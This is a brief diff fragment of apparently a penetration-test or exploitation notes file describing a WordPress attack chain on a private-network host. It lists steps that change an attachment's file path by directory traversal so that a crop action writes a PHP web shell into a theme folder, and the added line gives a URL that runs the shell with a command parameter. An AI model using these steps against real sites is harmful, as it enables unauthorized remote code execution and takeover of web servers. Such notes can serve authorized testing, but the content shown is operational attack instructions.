@@ -88,6 +88,7 @@ curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.p
 3. Edit attachment, change `_wp_attached_file` to `../../../../wp-content/themes/twentynineteen/shell.php` (traversal)
 4. Trigger crop via `admin-ajax.php?action=crop-image`
 5. Access the file in theme directory
+Browser-accessible: http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell2.php?cmd=whoami
 
 ---
 
